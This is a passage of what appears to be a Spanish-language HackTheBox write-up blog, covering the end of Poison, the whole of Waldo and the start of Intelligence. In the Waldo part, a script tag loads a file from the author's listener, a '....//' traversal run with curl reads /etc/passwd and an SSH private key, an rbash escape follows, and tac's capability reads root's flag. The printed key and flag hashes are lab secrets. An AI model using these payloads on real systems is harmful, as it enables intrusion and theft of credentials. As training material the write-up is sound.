<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ proxychains vncviewer 127.0.0.1:5901 <span class="nt">-passwd</span> secret
</code></pre></div></div>

<ul>
  <li>Estamos como root.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/9.png" />
</p>

<h2 id="root-flag">Root flag</h2>

<ul>
  <li>Vamos a poner la <code class="language-plaintext highlighter-rouge">sh</code> con permisos <code class="language-plaintext highlighter-rouge">SUID</code> para estar como <code class="language-plaintext highlighter-rouge">root</code> desde nuestra consola.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/10.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>charix@Poison:~ % /bin/sh
Cannot <span class="nb">read </span>termcap database<span class="p">;</span>
using dumb terminal settings.
<span class="c"># whoami</span>
root
<span class="c"># cat /root/root.txt</span>
716d04b188419cf2bb99d891272361f5
<span class="c"># </span>
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Waldo (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/08/25/waldo.html" rel="alternate" type="text/html" title="HackTheBox - Waldo (medium)" /><published>2024-08-25T00:00:00-06:00</published><updated>2024-08-25T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/08/25/waldo</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/08/25/waldo.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/de5b8119858c9c3ae0fcd4bf71587939.png" />
</p>

<ul>
  <li>Waldo is a medium difficulty machine, which highlights the risk of insufficient input validation, provides the challenge of rbash escape or bypassing, and showcases an interesting privilege escalation vector involving Linux Capabilities, all of which may be found in real environments.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.10.87 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-08-25 11:08 CST
Nmap scan report <span class="k">for </span>10.10.10.87
Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e <span class="o">(</span>RSA<span class="o">)</span>
|   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.12.2
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: List Manager
|_Requested resource was /list.html
|_http-server-header: nginx/1.12.2
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Estas son las tecnologías que están corriendo en el servicio web.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.87</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.87</span> <span class="p">[</span><span class="mi">302</span> <span class="no">Found</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.12</span><span class="o">.</span><span class="mi">2</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.87</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">7.1</span><span class="o">.</span><span class="mi">16</span><span class="p">],</span> <span class="no">RedirectLocation</span><span class="p">[</span><span class="sr">/list.html], X-Powered-By[PHP/</span><span class="mf">7.1</span><span class="o">.</span><span class="mi">16</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.12</span><span class="o">.</span><span class="mi">2</span><span class="p">]</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.87</span><span class="o">/</span><span class="n">list</span><span class="p">.</span><span class="nf">html</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.12</span><span class="o">.</span><span class="mi">2</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.87</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">List</span> <span class="no">Manager</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.12</span><span class="o">.</span><span class="mi">2</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/waldo/1.png" />
</p>

<ul>
  <li>Vemos 2 listas y un botón de borrar si borramos una vemos que si se borra.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/waldo/2.png" />
</p>

<ul>
  <li>Si presionamos en el botón de list2 nos muestra contenido.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/waldo/3.png" />
</p>

<ul>
  <li>Si damos click en <code class="language-plaintext highlighter-rouge">PWN</code> nos deja editarla.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/waldo/4.png" />
</p>

<ul>
  <li>Vamos añadir una nueva dando <code class="language-plaintext highlighter-rouge">click</code> en <code class="language-plaintext highlighter-rouge">add</code> y inyectar código <code class="language-plaintext highlighter-rouge">html</code> para ver si se refleja dentro de list 1.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h1&gt;</span>hola<span class="nt">&lt;/h1&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vemos que se refleja.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/waldo/5.png" />
</p>

<ul>
  <li>Como se esta interpretando la etiqueta vamos a ejecutar un servidor http con python3 para ver si recibimos alguna petición.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 8080
Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>Vamos a inyectar lo siguiente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"http://10.10.14.23:8080/zi.js"</span><span class="o">&gt;</span>&lt;/script&gt;
</code></pre></div></div>

<ul>
  <li>
    <p>Bueno si esperamos varios minutos no recibimos nada así que descartamos posibles ataques mediante las etiquetas html de momento.</p>
  </li>
  <li>
    <p>Vamos hacer Fuzzing para ver si encontramos nuevas rutas.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hl</span><span class="o">=</span>0 <span class="nt">-t</span> 200 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt http://10.10.10.87/list.html/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.87/list.html/FUZZ
Total requests: 87664

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

</span></code></pre></div></div>

<h2 id="path-traversal">PATH Traversal</h2>

<ul>
  <li>No encontramos nada, vamos a capturar con <code class="language-plaintext highlighter-rouge">Burpsuite</code> la petición de la pagina web <code class="language-plaintext highlighter-rouge">http://10.10.10.87/list.html</code> para ver como esta todo por detrás.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ burpsuite &amp;&gt;/dev/null &amp; <span class="nb">disown</span>
</code></pre></div></div>

<ul>
  <li>Si también capturamos peticiones cuando damos en add vemos rutas nuevas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/waldo/6.png" />
</p>

<ul>
  <li>
    <p>Vamos a capturar la petición al acceder a alguna lista.</p>
  </li>
  <li>
    <p>Vemos que apunta a otra ruta <code class="language-plaintext highlighter-rouge">.php</code> y vemos un <code class="language-plaintext highlighter-rouge">file=</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/waldo/7.png" />
</p>

<ul>
  <li>Vamos a enviar la petición y vemos el contenido de lo que hay dentro.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/waldo/8.png" />
</p>

<ul>
  <li>
    <p>Como tal tiene una estructura de directorios así que vamos a tratar de cargar el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> haciendo un <code class="language-plaintext highlighter-rouge">path traversal</code>.</p>
  </li>
  <li>
    <p>Pero nada.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/waldo/9.png" />
</p>

<ul>
  <li>Si aplicamos un pequeño Bypass vemos que funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/waldo/10.png" />
</p>

<ul>
  <li>Vemos al usuario nobody, operator y postgres con una sh.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://10.10.10.87/fileRead.php"</span> <span class="nt">-d</span> <span class="s1">'file=./.list/....//....//....//....//....//....//etc/passwd'</span> | jq <span class="s1">'.["file"]'</span> <span class="nt">-r</span> | <span class="nb">grep</span> <span class="s2">"sh$"</span>
root:x:0:0:root:/root:/bin/ash
operator:x:11:0:operator:/root:/bin/sh
postgres:x:70:70::/var/lib/postgresql:/bin/sh
nobody:x:65534:65534:nobody:/home/nobody:/bin/sh
</code></pre></div></div>

<ul>
  <li>Si enumeramos su directorio personal encontramos su clave privada dentro de la carpeta .ssh.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://10.10.10.87/fileRead.php"</span> <span class="nt">-d</span> <span class="s1">'file=./.list/....//....//....//....//....//....//home/nobody/.ssh/.monitor'</span> | jq <span class="s1">'.["file"]'</span> <span class="nt">-r</span>
<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl
mR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f
87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS
dGCc/gNpW/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN
o8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8/6pceowqs9ujRkNzH9T1lJq4Fx1V
vi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl/wdmuPEW6kU
vmzhRU3gcjuzwBET0TNejbL/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR/6
pKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5
8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q
1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox/05qoOBL4kQxUM7
VxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS
dVa3yLECgYEA7jk51MvUGSIFF6GkXsNb/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO
v0og0X/iROXAcp6Z9WGpIc6FhVgJd/4bNlTR+A/lWQwFt1b6l03xdsyaIyIWi9xr
xsb2sLNWP56A/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY
qFfdAWrvVZjp26Yf/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI
yzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1
/pAcw/+/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw/IMnLa3drm3CIAa32iU
LRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ/
lnN2n1WyTIyEuGA/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp
w7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9
1HLmBkDTjjj/xAJAZuiOF4Rs/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT
rj1BhUCzZCUgQABtpC6vYj/HLLlzpiC05AIEhDdvToPK/0WuY64fds0VccAYmMDr
X/PlAoGAS6UhbCm5TWZhtL/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2
DvVny8gKbM/OenwHnTlwRTEj5qdeAM40oj/mwCDc6kpV1lJXrW2R5mCH9zgbNFla
W0iKCBUAm5xZgU/YskMsCBMNmA8A5ndRWGFEFE+VGDVPaRie0ro<span class="o">=</span>
<span class="nt">-----END</span> RSA PRIVATE KEY-----
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nano id_rsa
❯ <span class="nb">chmod </span>600 id_rsa
</code></pre></div></div>

<h2 id="shell-as-nobody">Shell as nobody</h2>

<ul>
  <li>Ahora nos conectamos por ssh.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh <span class="nt">-i</span> id_rsa nobody@10.10.10.87
The authenticity of host <span class="s1">'10.10.10.87 (10.10.10.87)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:V+5vDo94JYcOMESxNxxs0je359eF2cxyHZS7vQtBQ1A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.10.87<span class="s1">' (ED25519) to the list of known hosts.
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &lt;http://wiki.alpinelinux.org&gt;.
waldo:~$ whoami
nobody
waldo:~$ 
</span></code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Podemos ver la primer flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
cccbc59b1b8a9965f7eac3e8ebfa8529
waldo:~<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>No vemos nada interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
./usr/bin/passwd
./usr/bin/chage
./usr/bin/expiry
./usr/bin/chfn
./usr/bin/chsh
./usr/bin/newgrp
./usr/bin/gpasswd
waldo:/<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>El PATH que tenemos es muy pequeño así que vamos a exportar el de nosotros.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:/<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
waldo:/<span class="nv">$ </span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:/<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/miguelrega7/
.fzf/bin
waldo:/<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/miguelrega7/.fzf/bin
waldo:/<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Si nos vamos al directorio <code class="language-plaintext highlighter-rouge">.ssh</code> vemos que la clave le pertenece al usuario monitor.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:~/.ssh<span class="nv">$ </span><span class="nb">cat </span>authorized_keys <span class="p">;</span> <span class="nb">echo
</span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM/VNgdz7ijwPfraXk3B/oKmWZHgkfqfg1xx2bVlT6oHvuWLxk6/KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp/zuzQVkGFgCLMas014suEHUhkiOkNUlRtJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbBVeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz/qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+arOD6NJOFJY4jBHvf monitor@waldo
waldo:~/.ssh<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Si nos conectamos por SSH vemos que estamos en una <code class="language-plaintext highlighter-rouge">restricted bash</code> <a href="https://weblinus.com/como-restringir-la-shell-de-usuario-con-rbash/">https://weblinus.com/como-restringir-la-shell-de-usuario-con-rbash/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:~/.ssh<span class="nv">$ </span>ssh <span class="nt">-i</span> .monitor monitor@localhost
Linux waldo 4.19.0-25-amd64 <span class="c">#1 SMP Debian 4.19.289-2 (2023-08-08) x86_64</span>
           &amp;.                                                                  
          @@@,@@/ %                                                            
       <span class="c">#*/%@@@@/.&amp;@@,                                                          </span>
   @@@#@@#&amp;@#&amp;#&amp;@@@,<span class="k">*</span>%/                                                        
   /@@@&amp;###########@@&amp;<span class="k">*</span><span class="o">(</span><span class="k">*</span>                                                      
 <span class="o">(</span>@################%@@@@@.     /<span class="k">**</span>                                             
 @@@@&amp;#############%@@@@@@@@@@@@@@@@@@@@@@@@%<span class="o">((</span>/                               
 %@@@@%##########&amp;@@@....                 .#%#@@@@@@@#                         
 @@&amp;%#########@@@@/                        <span class="k">*</span>/@@@%<span class="o">(((</span>@@@%                       
    @@@#%@@%@@@,                       <span class="k">*</span>&amp;@@@&amp;%<span class="o">(((</span><span class="c">#((((@@(                      </span>
     /<span class="o">(</span>@@@@@@@                     <span class="k">*</span>&amp;@@@@%<span class="o">((((((((((((</span><span class="c">#@@(                     </span>
       %/#@@@/@ @#/@          ..@@@@%<span class="o">(((((((((((</span><span class="c">#((#@@@@@@@@@@@@&amp;#,            </span>
          %@<span class="k">*</span><span class="o">(</span>@#%@.,       /@@@@&amp;<span class="o">(((((((((((((((</span>&amp;@@@@@@&amp;#######%%@@@@#    &amp;    
        <span class="k">*</span>@@@@@#        .&amp;@@@#<span class="o">(((</span><span class="c">#(#((((((((#%@@@@@%###&amp;@@@@@@@@@&amp;%##&amp;@@@@@@/   </span>
       /@@          <span class="c">#@@@&amp;#(((((((((((#((@@@@@%%%%@@@@%#########%&amp;@@@@@@@@&amp;     </span>
      <span class="k">*</span>@@      <span class="k">*</span>%@@@@#<span class="o">((((((((((((((</span><span class="c">#@@@@@@@@@@%####%@@@@@@@@@@@@###&amp;@@@@@@@&amp;  </span>
      %@/ .&amp;%@@%#<span class="o">(((((((((((((((</span><span class="c">#@@@@@@@&amp;#####%@@@%#############%@@@&amp;%##&amp;@@/   </span>
      @@@@@@%<span class="o">(((((((((((</span><span class="c">##(((@@@@&amp;%####%@@@%#####&amp;@@@@@@@@@@@@@@@&amp;##&amp;@@@@@@@@@/</span>
     @@@&amp;<span class="o">(((</span><span class="c">#((((((((((((#@@@@@&amp;@@@@######@@@###################&amp;@@@&amp;#####%@@* </span>
     @@#<span class="o">(((((((((((((</span><span class="c">#@@@@%&amp;@@.,,.*@@@%#####@@@@@@@@@@@@@@@@@@@%####%@@@@@@@@@@</span>
     <span class="k">*</span>@@%<span class="o">((((((((</span><span class="c">#@@@@@@@%#&amp;@@,,.,,.&amp;@@@#####################%@@@@@@%######&amp;@@.</span>
       @@@#<span class="o">(</span><span class="c">#&amp;@@@@@&amp;##&amp;@@@&amp;#@@/,,,,,,,,@@@&amp;######&amp;@@@@@@@@&amp;&amp;%######%@@@@@@@@@@@</span>
        @@@@@@&amp;%&amp;@@@%#&amp;@%%@@@@/,,,,,,,,,,/@@@@@@@#/,,.<span class="k">*</span>&amp;@@%&amp;@@@@@@&amp;%#####%@@@@.
          .@@@###&amp;@@@%%@<span class="o">(</span>,,,%@&amp;,.,,,,,,,,,,,,,.<span class="k">*</span>&amp;@@@@&amp;<span class="o">(</span>,<span class="k">*</span>@&amp;#@%%@@@@@@@@@@@@<span class="k">*</span>   
            @@%##%@@/@@@%/@@@@@@@@@#,,,,.../@@@@@%#%&amp;@@@@<span class="o">(</span>&amp;@&amp;@&amp;@@@@<span class="o">(</span>           
            .@@&amp;##@@,,/@@@@&amp;<span class="o">(</span><span class="nb">.</span>  .&amp;@@@&amp;,,,.&amp;@@/         <span class="c">#@@%@@@@@&amp;@@@/          </span>
           <span class="k">*</span>@@@@@&amp;@@.<span class="k">*</span>@@@          %@@@<span class="k">*</span>,&amp;@@            <span class="k">*</span>@@@@@&amp;.#/,@/          
          <span class="k">*</span>@@&amp;<span class="k">*</span><span class="c">#@@@@@@@&amp;     #@(    .@@@@@@&amp;    ,@@@,    @@@@@(,@/@@           </span>
          <span class="k">*</span>@@/@#.#@@@@@/    %@@@,   .@@&amp;%@@@     &amp;@&amp;     @@<span class="k">*</span>@@<span class="k">*</span><span class="o">(</span>@@#            
           <span class="o">(</span>@@/@,,@@&amp;@@@            &amp;@@,,<span class="o">(</span>@@&amp;          .@@%/@@,@@              
             /@@@<span class="k">*</span>,@@,@@@<span class="k">*</span>         @@@,,,,,@@@@.     <span class="k">*</span>@@@%,@@<span class="k">**</span>@#              
               %@@.%@&amp;,<span class="o">(</span>@@@@,  /&amp;@@@@,,,,,,,%@@@@@@@@@@%,,<span class="k">*</span>@@,#@,              
                ,@@,&amp;@,,,,<span class="o">(</span>@@@@@@@<span class="o">(</span>,,,,,.,,,,,,,,<span class="k">**</span>,,,,,,.<span class="k">*</span>@/,&amp;@               
                 &amp;@,<span class="k">*</span>@@.,,,,,..,,,,&amp;@@%/<span class="k">**</span>/@@<span class="k">*</span>,,,,,&amp;<span class="o">(</span>.,,,.@@,,@@               
                 /@%,&amp;@/,,,,/@%,,,,,<span class="k">*</span>&amp;@@@@@#.,,,,,.@@@<span class="o">(</span>,,<span class="o">(</span>@@@@@<span class="o">(</span>               
                  @@<span class="k">*</span>,@@,,,#@@@&amp;<span class="k">*</span>..,,,,,,,,,,,,/@@@@,<span class="k">*</span><span class="o">(</span>,,&amp;@/#<span class="k">*</span>                 
                  <span class="k">*</span>@@@@@<span class="o">(</span>,,@<span class="k">*</span>,%@@@@@@@&amp;&amp;#%@@@@@@@/,,,,,,,@@                    
                       @@<span class="k">*</span>,,,,,,,,,.<span class="k">*</span>/<span class="o">(</span>//<span class="k">*</span>,..,,,,,,,,,,,&amp;@,                    
                        @@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                     
                        &amp;@&amp;,,,,,,,,,,,,,,,,,,,,,,,,,,,,&amp;@#                     
                         %@<span class="o">(</span>,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                      
                         ,@@,,,,,,,,@@@&amp;&amp;&amp;%&amp;@,,,,,..,,@@,                      
                          <span class="k">*</span>@@,,,,,,,.,<span class="k">****</span>,..,,,,,,,,&amp;@@                       
                           <span class="o">(</span>@<span class="o">(</span>,,,.,,,,,,,,,,,,,,.,,,/@@                        
                           .@@,,,,,,,,,,,,,...,,,,,,@@                         
                            ,@@@,,,,,,,,,,,,,,,,.<span class="o">(</span>@@@                          
                              %@@@@&amp;<span class="o">(</span>,,,,<span class="k">*</span><span class="o">(</span><span class="c">#&amp;@@@@@@,     </span>
                              
                            Here<span class="s1">'s Waldo, where'</span>s root?
Last login: Tue Dec  5 06:02:39 2023 from 127.0.0.1
<span class="nt">-rbash</span>: <span class="nb">alias</span>: <span class="nb">command </span>not found
monitor@waldo:~<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Bueno para salir simplemente hacemos lo siguiente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:~/.ssh<span class="nv">$ </span>ssh <span class="nt">-i</span> .monitor monitor@localhost bash
<span class="nb">whoami
</span>monitor
script /dev/null <span class="nt">-c</span> bash
Script started, file is /dev/null
monitor@waldo:~<span class="nv">$ </span>
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Ahora nuevamente exportamos nuestro PATH.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>monitor@waldo:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/miguelrega7/.fzf/bin
&lt;r/local/games:/usr/games:/home/miguelrega7/.fzf/bin
monitor@waldo:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
monitor@waldo:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
<span class="nb">echo</span> <span class="nv">$PATH</span>
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/miguelrega7/.fzf/bin
monitor@waldo:~<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Si enumeramos por <code class="language-plaintext highlighter-rouge">capabilities</code> encontramos la siguiente tac <a href="https://gtfobins.github.io/gtfobins/tac/">https://gtfobins.github.io/gtfobins/tac/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>monitor@waldo:/home/nobody<span class="nv">$ </span>getcap <span class="nt">-r</span> / 2&gt;/dev/null
getcap <span class="nt">-r</span> / 2&gt;/dev/null
/bin/ping <span class="o">=</span> cap_net_raw+ep
/usr/bin/tac <span class="o">=</span> cap_dac_read_search+ei
/home/monitor/app-dev/v0.1/logMonitor-0.1 <span class="o">=</span> cap_dac_read_search+ei
</code></pre></div></div>

<ul>
  <li>Bueno con eso podemos leer cualquier archivo privilegiado del sistema.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>monitor@waldo:/home/nobody<span class="nv">$ </span><span class="nb">tac</span> /root/root.txt
7f680a52657f6c1ee72752e7ab096955
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Intelligence (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/08/12/intelligence.html" rel="alternate" type="text/html" title="HackTheBox - Intelligence (medium)" /><published>2024-08-12T00:00:00-06:00</published><updated>2024-08-12T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/08/12/intelligence</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/08/12/intelligence.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/78c5d8511bae13864c72ba8df1329e8d.png" />
</p>

<ul>
  <li>Intelligence is a medium difficulty Windows machine that showcases a number of common attacks in an Active Directory environment. After retrieving internal PDF documents stored on the web server (by brute-forcing a common naming scheme) and inspecting their contents and metadata, which reveal a default password and a list of potential AD users, password spraying leads to the discovery of a valid user account, granting initial foothold on the system. A scheduled PowerShell script that sends authenticated requests to web servers based on their hostname is discovered; by adding a custom DNS record, it is possible to force a request that can be intercepted to capture the hash of a second user, which is easily crackable. This user is allowed to read the password of a group managed service account, which in turn has constrained delegation access to the domain controller, resulting in a shell with administrative privileges.</li>
</ul>

<h2 id="portscan">PortScan</h2>

